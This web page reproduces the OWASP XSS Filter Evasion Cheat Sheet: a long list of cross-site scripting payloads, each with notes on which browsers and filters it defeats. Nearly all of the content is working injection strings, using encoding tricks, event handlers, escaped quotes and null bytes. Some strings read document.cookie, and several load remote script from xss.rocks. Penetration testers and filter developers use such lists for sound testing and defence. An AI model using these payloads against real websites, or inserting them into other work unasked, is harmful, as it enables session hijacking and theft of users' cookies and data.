---
id: 37
title: XSS Payloads Cheat Sheet
date: 2017-02-07T14:40:47+00:00
author: Robbie
layout: page
guid: https://xsses.rocks/?page_id=2
---
## <span id="XSS_Locator_.28short.29" class="mw-headline">XSS Locator (short)</span>

If you don&#8217;t have much space and know there is no vulnerable JavaScript on the page, this string is a nice compact XSS injection check. View source after injecting it and look for <XSS verses <XSS to see if it is vulnerable:

<pre>'';!--"&lt;XSS&gt;=&{()}
</pre>

## <span id="No_Filter_Evasion" class="mw-headline">No Filter Evasion</span>

This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):

<pre>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;
</pre>

## <span id="Filter_bypass_based_polyglot" class="mw-headline">Filter bypass based polyglot</span>

<pre>'"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;"&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;
&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;"&gt;&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;
&lt;img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)&gt;'"&gt;
&lt;img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg"&gt;</pre>

## <span id="Image_XSS_using_the_JavaScript_directive" class="mw-headline">Image XSS using the JavaScript directive</span>

Image XSS using the JavaScript directive (IE7.0 doesn&#8217;t support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:

<pre>&lt;IMG SRC="javascript:alert('XSS');"&gt;
</pre>

## <span id="No_quotes_and_no_semicolon" class="mw-headline">No quotes and no semicolon</span>

<pre>&lt;IMG SRC=javascript:alert('XSS')&gt;
</pre>

## <span id="Case_insensitive_XSS_attack_vector" class="mw-headline">Case insensitive XSS attack vector</span>

<pre>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
</pre>

## <span id="HTML_entities" class="mw-headline">HTML entities</span>

The semicolons are required for this to work:

<pre>&lt;IMG SRC=javascript:alert("XSS")&gt;
</pre>

## <span id="Grave_accent_obfuscation" class="mw-headline">Grave accent obfuscation</span>

If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string &#8211; this is also useful because lots of cross site scripting filters don&#8217;t know about grave accents:

<pre>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
</pre>

## <span id="Malformed_A_tags" class="mw-headline">Malformed A tags</span>

Skip the HREF attribute and get to the meat of the XXS&#8230; Submitted by David Cross ~ Verified on Chrome

<a onmouseover=&#8221;alert(document.cookie)&#8221;>xxs link</a>

or Chrome loves to replace missing quotes for you&#8230; if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script.

<a onmouseover=alert(document.cookie)>xxs link</a>

## <span id="Malformed_IMG_tags" class="mw-headline">Malformed IMG tags</span>

Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tag:

<pre>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
</pre>

## <span id="fromCharCode" class="mw-headline">fromCharCode</span>

If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need:

<pre>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
</pre>

## <span id="Default_SRC_tag_to_get_past_filters_that_check_SRC_domain" class="mw-headline">Default SRC tag to get past filters that check SRC domain</span>

This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like onblur, onclick giving you an extensive amount of variations for many injections listed here. Submitted by David Cross .

Edited by Abdullah Hussam(@Abdulahhusam).

<pre>&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
</pre>

## <span id="Default_SRC_tag_by_leaving_it_empty" class="mw-headline">Default SRC tag by leaving it empty</span>

<pre>&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
</pre>

## <span id="Default_SRC_tag_by_leaving_it_out_entirely" class="mw-headline">Default SRC tag by leaving it out entirely</span>

<pre>&lt;IMG onmouseover="alert('xxs')"&gt;
</pre>

## <span id="On_error_alert" class="mw-headline">On error alert</span>

<pre>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;
</pre>

## <span id="IMG_onerror_and_javascript_alert_encode" class="mw-headline">IMG onerror and javascript alert encode</span>

<pre>&lt;img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"&gt;
</pre>

## <span id="Decimal_HTML_character_references" class="mw-headline">Decimal HTML character references</span>

all of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).

<pre>&lt;IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;&gt;
</pre>

## <span id="Decimal_HTML_character_references_without_trailing_semicolons" class="mw-headline">Decimal HTML character references without trailing semicolons</span>

This is often effective in XSS that attempts to look for &#8220;&#XX;&#8221;, since most people don&#8217;t know about padding &#8211; up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp_string =~ s/.\*\&#(\d+);.\*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I&#8217;ve seen this in the wild):

<pre>&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
</pre>

## <span id="Hexadecimal_HTML_character_references_without_trailing_semicolons" class="mw-headline">Hexadecimal HTML character references without trailing semicolons</span>

This is also a viable XSS attack against the above string $tmp_string =~ s/.\*\&#(\d+);.\*/$1/; which assumes that there is a numeric character following the pound symbol &#8211; which is not true with hex HTML characters).

<pre>&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
</pre>

## <span id="Embedded_tab" class="mw-headline">Embedded tab</span>

Used to break up the cross site scripting attack:

<pre>&lt;IMG SRC="jav	ascript:alert('XSS');"&gt;
</pre>

## <span id="Embedded_Encoded_tab" class="mw-headline">Embedded Encoded tab</span>

Use this one to break up XSS :

<pre>&lt;IMG SRC="jav&#x09;ascript:alert('XSS');"&gt;
</pre>

## <span id="Embedded_newline_to_break_up_XSS" class="mw-headline">Embedded newline to break up XSS</span>

Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:

<pre>&lt;IMG SRC="jav&#x0A;ascript:alert('XSS');"&gt;
</pre>

## <span id="Embedded_carriage_return_to_break_up_XSS" class="mw-headline">Embedded carriage return to break up XSS</span>

(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I&#8217;ve seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):

<pre>&lt;IMG SRC="jav&#x0D;ascript:alert('XSS');"&gt;
</pre>

## <span id="Null_breaks_up_JavaScript_directive" class="mw-headline">Null breaks up JavaScript directive</span>

Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use %00 in the URL string or if you want to write your own injection tool you can either use vim (^V^@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00is much more useful and helped me bypass certain real world filters with a variation on this example:

<pre>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out
</pre>

## <span id="Spaces_and_meta_chars_before_the_JavaScript_in_images_for_XSS" class="mw-headline">Spaces and meta chars before the JavaScript in images for XSS</span>

This is useful if the pattern match doesn&#8217;t take into account spaces in the word &#8220;javascript:&#8221; -which is correct since that won&#8217;t render- and makes the false assumption that you can&#8217;t have a space between the quote and the &#8220;javascript:&#8221; keyword. The actual reality is you can have any char from 1-32 in decimal:

<pre>&lt;IMG SRC=" &#14;  javascript:alert('XSS');"&gt;
</pre>

## <span id="Non-alpha-non-digit_XSS" class="mw-headline">Non-alpha-non-digit XSS</span>

The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example &#8220;<SCRIPT\s&#8221; != &#8220;<SCRIPT/XSS\s&#8221;:

<pre>&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</pre>

Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc&#8230;) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:

<pre>&lt;BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
</pre>

Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.

<pre>&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
</pre>

## <span id="Extraneous_open_brackets" class="mw-headline">Extraneous open brackets</span>

Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:

<pre>&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
</pre>

## <span id="No_closing_script_tags" class="mw-headline">No closing script tags</span>

In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don&#8217;t actually need the &#8220;></SCRIPT>&#8221; portion of this Cross Site Scripting vector. Firefox assumes it&#8217;s safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn&#8217;t effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they&#8217;re not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:

<pre>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;
</pre>

## <span id="Protocol_resolution_in_script_tags" class="mw-headline">Protocol resolution in script tags</span>

This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh&#8217;s protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The &#8220;.j&#8221; is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.

<pre>&lt;SCRIPT SRC=//xss.rocks/.j&gt;
</pre>

## <span id="Half_open_HTML.2FJavaScript_XSS_vector" class="mw-headline">Half open HTML/JavaScript XSS vector</span>

Unlike Firefox the IE rendering engine doesn&#8217;t add extra data to your page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn&#8217;t require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close &#8220;>&#8221; tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ because it doesn&#8217;t require the end &#8220;>&#8221;. As a side note, this was also affective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag:

<pre>&lt;IMG SRC="javascript:alert('XSS')"
</pre>

## <span id="Double_open_angle_brackets" class="mw-headline">Double open angle brackets</span>

Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won&#8217;t:

<pre>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;
</pre>

## <span id="Escaping_JavaScript_escapes" class="mw-headline">Escaping JavaScript escapes</span>

When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a=&#8221;$ENV{QUERY_STRING}&#8221;;</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <SCRIPT>var a=&#8221;\\&#8221;;alert(&#8216;XSS&#8217;);//&#8221;;</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:

<pre>\";alert('XSS');//
</pre>

An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:

<pre>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;
</pre>

## <span id="End_title_tag" class="mw-headline">End title tag</span>

This is a simple XSS vector that closes <TITLE> tags, which can encapsulate the malicious cross site scripting attack:

<pre>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
</pre>

## <span id="INPUT_image" class="mw-headline">INPUT image</span>

<pre>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
</pre>

## <span id="BODY_image" class="mw-headline">BODY image</span>

<pre>&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
</pre>

## <span id="IMG_Dynsrc" class="mw-headline">IMG Dynsrc</span>

<pre>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
</pre>

## <span id="IMG_lowsrc" class="mw-headline">IMG lowsrc</span>

<pre>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
</pre>

## <span id="List-style-image" class="mw-headline">List-style-image</span>

Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:

<pre>&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
</pre>

## <span id="VBscript_in_an_image" class="mw-headline">VBscript in an image</span>

<pre>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
</pre>

## <span id="Livescript_.28older_versions_of_Netscape_only.29" class="mw-headline">Livescript (older versions of Netscape only)</span>

<pre>&lt;IMG SRC="livescript:[code]"&gt;
</pre>

## <span id="SVG_object_tag" class="mw-headline">SVG object tag</span>

<pre>&lt;svg/onload=alert('XSS')&gt;
</pre>

## <span id="ECMAScript_6" class="mw-headline">ECMAScript 6</span>

<pre>Set.constructor`alert\x28document.domain\x29```
</pre>

## <span id="BODY_tag" class="mw-headline">BODY tag</span>

Method doesn&#8217;t require using any variants of &#8220;javascript:&#8221; or &#8220;<SCRIPT&#8230;&#8221; to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign (&#8220;onload=&#8221; != &#8220;onload =&#8221;):

<pre>&lt;BODY ONLOAD=alert('XSS')&gt;

take from</pre>

[https://www.owasp.org/index.php/XSS\_Filter\_Evasion\_Cheat\_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)